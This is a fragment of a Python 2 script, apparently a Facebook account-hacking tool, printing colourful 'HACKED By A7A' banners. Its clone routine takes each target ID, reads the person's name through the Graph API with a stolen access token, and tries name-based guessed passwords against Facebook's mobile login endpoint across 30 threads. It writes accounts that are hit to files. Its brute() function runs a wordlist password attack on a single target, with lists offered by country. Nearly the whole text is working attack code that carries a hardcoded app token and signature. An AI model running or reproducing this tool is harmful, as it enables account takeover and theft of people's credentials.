    print ' \x1b[1;31;40m\xe2\x9a\xa1\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x84\xe2\x96\xba\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x9a\xa1'
    jalan(' \x1b[1;93mCloning Started  Wait...')
    print '\x1b[1;36;40m \xe2\x9a\xa1\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x84\xe2\x96\xba\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x9a\xa1'

    def main(arg):
        user = arg
        try:
            os.mkdir('output')
        except OSError:
            pass

        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(a.text)
            pass1 = b['first_name'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[HACKED By A7A] \x1b[1;92m ' + user + ' \x1b[1;94m|\x1b[1;92m ' + pass1 + ' >> ' + b['first_name']
                oks.append(user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass1 + ' >> ' + b['first_name']
                cek = open('output/cp.txt', 'a')
                cek.write(user + '|' + pass1 + '\n')
                cek.close()
                cekpoint.append(user + pass1)
            else:
                pass2 = '123123'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92m[HACKED By A7A] \x1b[1;92m ' + user + ' \x1b[1;92m | \x1b[1;92m ' + pass2 + ' >> ' + b['first_name']
                    oks.append(user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass2 + ' >> ' + b['first_name']
                    cek = open('output/cp.txt', 'a')
                    cek.write(user + '|' + pass2 + '\n')
                    cek.close()
                    cekpoint.append(user + pass2)
                else:
                    pass3 = b['first_name'] + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m[HACKED By A7A] \x1b[1;92m ' + user + ' \x1b[1;92m | \x1b[1;92m ' + pass3 + ' >> ' + b['first_name']
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass3 + ' >> ' + b['first_name']
                        cek = open('output/cp.txt', 'a')
                        cek.write(user + '|' + pass3 + '\n')
                        cek.close()
                        cekpoint.append(user + pass4)
                    else:
                        pass4 = b['first_name'] + '112233'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;92m[HACKED By A7A] \x1b[1;92m ' + user + ' \x1b[1;92m | \x1b[1;92m ' + pass4 + ' >> ' + b['first_name']
                            oks.append(user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass4 + ' >> ' + b['first_name']
                            cek = open('output/cp.txt', 'a')
                            cek.write(user + '|' + pass4 + '\n')
                            cek.close()
                            cekpoint.append(user + pass4)
                        else:
                            pass5 = b['last_name'] + '123321'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m[HACKED By A7A] \x1b[1;92m ' + user + ' \x1b[1;36;40m | \x1b[1;92m ' + pass5 + ' >> ' + b['first_name']
                                oks.append(user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass5 + ' >> ' + b['first_name']
                                cek = open('output/cp.txt', 'a')
                                cek.write(user + '|' + pass5 + '\n')
                                cek.close()
                                cekpoint.append(user + pass5)
                            else:
                                pass6 = b['first_name'] + '123456'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                q = json.load(data)
                                if 'access_token' in q:
                                    print '\x1b[1;92m[HACKED By A7A] \x1b[1;92m ' + user + ' \x1b[1;36;40m | \x1b[1;92m ' + pass6 + ' >> ' + b['first_name']
                                    oks.append(user + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass6 + ' >> ' + b['first_name']
                                    cek = open('output/cp.txt', 'a')
                                    cek.write(user + '|' + pass6 + '\n')
                                    cek.close()
                                    cekpoint.append(user + pass6)
                                else:
                                    pass7 = '112233445566'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;92m[HACKED By A7A] \x1b[1;92m ' + user + ' \x1b[1;36;40m | \x1b[1;92m ' + pass7 + ' >> ' + b['first_name']
                                        oks.append(user + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass7 + ' >> ' + b['first_name']
                                        cek = open('output/cp.txt', 'a')
                                        cek.write(user + '|' + pass7 + '\n')
                                        cek.close()
                                        cekpoint.append(user + pass7)
                                    else:
                                        pass8 = '11221122'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        q = json.load(data)
                                        if 'access_token' in q:
                                            print '\x1b[1;92m[HACKED By A7A] \x1b[1;92m ' + user + ' \x1b[1;36;40m | \x1b[1;92m ' + pass8 + ' >> ' + b['first_name']
                                            oks.append(user + pass8)
                                        elif 'www.facebook.com' in q['error_msg']:
                                            print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass8 + ' >> ' + b['first_name']
                                            cek = open('output/cp.txt', 'a')
                                            cek.write(user + '|' + pass8 + '\n')
                                            cek.close()
                                            cekpoint.append(user + pass8)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;31;40m[\xe2\x9c\x93] Process Has Been Completed\x1b[1;96m....'
    print '\x1b[1;32;40m[\xe2\x9a\xa1] Total OK/\x1b[1;93mCP \x1b[1;91m: \x1b[1;91m' + str(len(oks)) + '\x1b[1;31;40m/\x1b[1;36;40m' + str(len(cekpoint))
    print '\x1b[1;34;40m[\xe2\x9a\xa1] CP File Has Been Saved : save/cp.txt'
    print logo4
    print '\n\x1b[1;31;40m \xe2\x9a\xa1\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x84\xe2\x96\xba\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x9a\xa1\n           '
    raw_input('\n\x1b[1;96m[\x1b[1;97mExit\x1b[1;96m]')
    menu()


def brute():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[\xe2\x9a\xa1] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.5)
        login()
    else:
        os.system('clear')
        print logo
        print '\x1b[1;31;40m \xe2\x9a\xa1\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x84\xe2\x96\xba\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x9a\xa1'
        try:
            email = raw_input('\x1b[1;91m[+] \x1b[1;92mID\x1b[1;97m/\x1b[1;92mEmail \x1b[1;97mTarget \x1b[1;91m:\x1b[1;97m ')
            print '\x1b[0;31;47mFor  All in one  passlist  Type       passlist.txt\x1b[1;31;47m'
            print '\x1b[0;31;47mFor   Pakistan   passlist  Type    passlistpak.txt\x1b[1;31;47m'
            print '\x1b[0;31;47mFor    Indian    passlist  Type  passlistindia.txt\x1b[1;31;47m'
            print '\x1b[0;31;47mFor      USA     passlist  Type    passlistusa.txt\x1b[1;32;47m'
            passw = raw_input('\x1b[1;91m[+] \x1b[1;92mWordlist \x1b[1;92mext(list.txt) \x1b[1;91m: \x1b[1;97m')
            total = open(passw, 'r')
            total = total.readlines()
            print '\x1b[1;31;40m \xe2\x9a\xa1\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x84\xe2\x96\xba\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x9a\xa1'
            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mTarget \x1b[1;91m:\x1b[1;97m ' + email
            print '\x1b[1;91m[+] \x1b[1;92mTotal\x1b[1;96m ' + str(len(total)) + ' \x1b[1;92mPassword'
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            sandi = open(passw, 'r')
            for pw in sandi:
                try:
                    pw = pw.replace('\n', '')
                    sys.stdout.write('\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mTry \x1b[1;97m' + pw)
                    sys.stdout.flush()
                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    mpsh = json.loads(data.text)
                    if 'access_token' in mpsh:
                        dapat = open('Brute.txt', 'w')
                        dapat.write(email + ' | ' + pw + '\n')
                        dapat.close()
                        print '\n\x1b[1;91m[\xe2\x9a\xa1] \x1b[1;92mFounded.'
                        print 52 * '\x1b[1;97m\xe2\x95\x90'
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw
                        keluar()
                    elif 'www.facebook.com' in mpsh['error_msg']:
                        ceks = open('Brutecekpoint.txt', 'w')
                        ceks.write(email + ' | ' + pw + '\n')
                        ceks.close()
                        print '\n\x1b[1;91m[\xe2\x9a\xa1] \x1b[1;92mFounded.'
                        print '\x1b[1;36;40m \xe2\x9a\xa1\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x84\xe2\x96\xba\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x9a\xa1'
                        print '\x1b[1;91m[\xe2\x9a\xa1] \x1b[1;93mAccount Maybe Checkpoint'
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw
                        keluar()
                except requests.exceptions.ConnectionError:
                    print '\x1b[1;91m[\xe2\x9a\xa1] Connection Error'
                    time.sleep(1)

        except IOError:
            print '\x1b[1;91m[\xe2\x9a\xa1] File not found...'
            print "\n\x1b[1;91m[\xe2\x9a\xa1] \x1b[1;92mLooks like you don't have a wordlist"
            menu()


if __name__ == '__main__':
    login()
